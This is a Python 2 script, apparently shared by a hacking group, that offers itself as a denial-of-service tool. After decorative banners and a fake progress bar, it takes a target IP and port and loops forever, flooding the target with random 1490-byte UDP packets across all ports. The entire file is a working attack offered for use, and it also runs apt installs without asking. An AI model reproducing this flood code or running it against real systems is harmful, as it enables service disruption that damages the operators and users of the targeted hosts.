import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("apt install figlet")
os.system("apt install figlet lolcat")
os.system("apt install figlet toilet")
os.system("clear")
print ("##########################################################################################")
os.system("figlet -c DOS ATTACK")
print (":/:  script by W-Hacker (Weir MO):/:")
print ("###########################################################################################")
os.system("figlet -c WHacker")
print ("###########################################################################################")
print ("#                                                                                         #")
print ("#                     #########################################                           #")
print ("#                     #       Author   : W-Hacker TH          #                           #")
print ("#                     #       Group    : Slasher Spy Team     #                           #")
print ("#                     #       Codename : WHK-TH               #                           #")
print ("#                     #       Version  : 1.0                  #                           #")
print ("#                     #       usage    : python2 DOS-WHKTH.py #                           #")
print ("#                     #########################################                           #")
print ("#                                                                                         #")
print ("###########################################################################################")
print
print
print
print
ip = raw_input("IP Address : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Dos is Starting")
print ("[***************************************] 0% ")
time.sleep(5)
print ("[##########*****************************] 25%")
time.sleep(5)
print ("[######################*****************] 50%")
time.sleep(5)
print ("[###################################****] 75%")
time.sleep(5)
print ("[#######################################] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

